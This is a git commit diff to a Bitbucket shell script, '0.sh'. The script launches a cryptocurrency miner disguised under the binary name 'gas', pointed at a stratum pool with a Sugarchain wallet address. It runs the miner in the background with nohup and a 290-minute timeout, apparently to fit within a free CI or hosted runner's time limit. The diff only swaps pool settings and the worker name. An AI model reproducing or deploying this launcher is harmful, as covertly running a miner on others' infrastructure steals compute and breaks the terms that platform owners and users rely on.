744a1366631245e6d8e9b5e3d8e600b5a041388f
sis maryanto <sismaryanto1928@gmail.com>
2021-07-01 02:48:36 +0000

    0.sh edited online with Bitbucket

--- 0.sh
+++ 0.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 chmod u+x gas
-POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
-WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.ahaha
-nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET -t12 &
+POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
+WALLET=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as.tai
+nohup timeout 290m ./gas -a yespowersugar -o $POOL -u $WALLET &
 jobs
 echo "haha"
 apt-get update -y
